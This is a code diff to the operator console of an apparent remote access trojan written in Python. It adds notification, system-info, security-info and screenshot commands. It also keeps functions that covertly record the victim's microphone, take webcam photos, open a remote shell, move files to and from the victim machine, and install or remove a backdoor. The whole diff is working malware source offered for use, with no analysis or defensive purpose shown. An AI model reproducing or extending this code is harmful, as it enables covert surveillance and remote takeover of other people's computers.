@@ -1,54 +1,89 @@
 from .encrypter import *
 from .system import system
+from .options import *
+from .comm import send_data, recv_data
 from colorama import Fore, init, Style
 from threading import *
-from cryptography.fernet import Fernet
-import random, os, struct
+import random, os, struct, simplejson
 
-def recv_data(conn):
+def send_notification(conn, address):
+    title = "Title"
+    message = "Message"
+    app = "App"
+    while True:
+        system.clear_screen()
+        system.printheader()
+        print(Fore.LIGHTCYAN_EX + options.notification_options)
+        command = system.input(10)
+        if command == "1":
+            title = system.input(7)
+        elif command == "2":
+            message = system.input(8)
+        elif command == "3":
+            app = system.input(9)
+        elif command == "4":
+            try:
+                send_data(conn, b"MODE_NOTIFICATION")
+                json_send(conn, {"title":title, "message":message, "app":app})
+            except Exception as e:
+                print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
+            break
+        elif command == "9": break
+    
+    input("OK")
+
+def json_receive(conn):
+    json_data = ""
     try:
-        size_data = conn.recv(4)
-        if not size_data or len(size_data) < 4:
-            print(Fore.LIGHTRED_EX + "[-] Session Closed!")
-            exit(0)
-        size = struct.unpack('>I', size_data)[0]
-        data = conn.recv(size)
-        if not data or len(data) < size:
-            print(Fore.LIGHTRED_EX + "[-] Session Closed!")
-            exit(0)
-        return decrypt(data)
-    except Exception as e:
-        print(Fore.LIGHTRED_EX + "[!] Error: {}".format(e))
-        exit(0)
+        json_data = json_data + recv_data(conn)
+    except:pass
+    return simplejson.loads(json_data)
+
+def json_send(conn, data):
+    try:
+        json_data = simplejson.dumps(data)
+        send_data(conn, json_data.encode("utf-8"))
+    except Exception as e: print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
 
 def geo(conn, address):
-    conn.send(encrypt(b"MODE_GEO"))
+    send_data(conn, b"MODE_GEO")
     data = recv_data(conn)
-    print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data.decode())
+    print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data)
+    input("OK")
+
+def secinfo(conn, address):
+    send_data(conn, b"MODE_SECINFO")
+    data = json_receive(conn)
+    options.printSecurityInfoText(data)
+    input("OK")
+
+def sysinfo(conn, address):
+    send_data(conn, b"MODE_SYSINFO")
+    data = json_receive(conn)
+    print(options.getSystemInfoText(data))
     input("OK")
 
 def mic(conn, address):
     number = random.randint(0, 9999999)
     print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
-    conn.send(encrypt(b"MODE_MIC"))
-    data = recv_data(conn)
+    send_data(conn, b"MODE_MIC")
+    data = recv_data(conn, decode=False)
     with open(f"records/record{number}.wav", "wb") as f:
         f.write(data)
         f.close()
     print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: records/record{number}.wav")
     input("OK")
 def getInput(conn):
-    conn.send(encrypt(b"SHELLINFO"))
-    return recv_data(conn).decode()
+    send_data(conn, b"SHELLINFO")
+    return recv_data(conn)
 def shell(conn, address):
-    conn.send(encrypt(b"MODE_SHELL"))
+    send_data(conn, b"MODE_SHELL")
     try:
-        print(decrypt(conn.recv(1024)).decode())
         while True:
             cmd = input(getInput(conn))
+            send_data(conn, cmd.encode())
             if not cmd.strip():
                 continue
-            conn.send(encrypt(cmd.encode()))
             if cmd == 'exit':
                 system.clear_screen()
                 break
@@ -56,36 +91,39 @@ def shell(conn, address):
                 system.clear_screen()
             try:
                 output = recv_data(conn)
-                print(Fore.LIGHTGREEN_EX + output.decode(errors='ignore'))
+                print(Fore.LIGHTGREEN_EX + output)
             except Exception as e:
                 print(Fore.LIGHTRED_EX + f"[!] Error: {e}")
+                input("OK")
                 break
     except Exception as e:
         print(Fore.LIGHTRED_EX + f"[!] Error In Shell Mode: {e}")
+        input("OK")
 
-def upload(conn, address):
-    path = input("File Path: ")
-    name = input("Destination File Name: ")
+def upload(conn, address, path=None, name=None):
+    path = path or input("File Path: ")
+    name= name or input("Destination File Name: ")
+        
     try:
         with open(path, 'rb') as f:
             data = f.read()
-        conn.send(encrypt(b"MODE_UPLOAD"))
-        conn.send(encrypt(name.encode()))
+        send_data(conn, b"MODE_UPLOAD")
+        send_data(conn, name.encode())
 
         control = recv_data(conn)
-        conn.send(encrypt(data))
+        send_data(conn, data)
         print(Fore.LIGHTCYAN_EX + "[+] File Uploaded")
     except Exception as error:
         print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
     input("OK")
     
 def download(conn, address):
-    conn.send(encrypt(b"MODE_DOWNLOAD"))
+    send_data(conn, b"MODE_DOWNLOAD")
     path = input("File Path: ")
     name = input("Destination File Name: ")
-    conn.send(encrypt(path.encode()))
+    send_data(conn, path.encode())
     try:
-        conn.send(encrypt(b'control'))
+        send_data(conn, b'control')
 
         data = recv_data(conn)
         with open(name, 'w') as f:
@@ -97,21 +135,33 @@ def download(conn, address):
 def cam(conn, address):
     number = random.randint(0, 9999999)
     print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
-    conn.send(encrypt(b"MODE_CAM"))
-    data = recv_data(conn)
+    send_data(conn, b"MODE_CAM")
+    data = recv_data(conn, decode=False)
     with open(f"photos/photo{number}.jpg", "wb") as f:
         f.write(data)
     print(Fore.LIGHTCYAN_EX + f"[+] Taked Photo: photos/photo{number}.jpg")
     input("OK")
 
+def screenshot(conn, address):
+    try:
+        number = random.randint(0, 9999999)
+        print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
+        send_data(conn, b"MODE_SCREENSHOT")
+        data = recv_data(conn, decode=False)
+        with open(f"photos/screenshot{number}.jpg", "wb") as f:
+            f.write(data)
+        print(Fore.LIGHTCYAN_EX + f"[+] Screenshot: photos/screenshot{number}.jpg")
+    except: print(Exception)
+    input("OK")
+
 def backdoor(conn, address):
-    conn.send(encrypt(b"MODE_BACKDOOR"))
+    send_data(conn, b"MODE_BACKDOOR")
     data = recv_data(conn)
     print(Fore.LIGHTCYAN_EX + f"[+] Created Backdoor")
     input("OK")
 
 def delete(conn, address):
-    conn.send(encrypt(b"MODE_DEL"))
+    send_data(conn, b"MODE_DEL")
     data = recv_data(conn)
     print(Fore.LIGHTCYAN_EX + "[+] Destroyed Backdoor")
     input("OK")
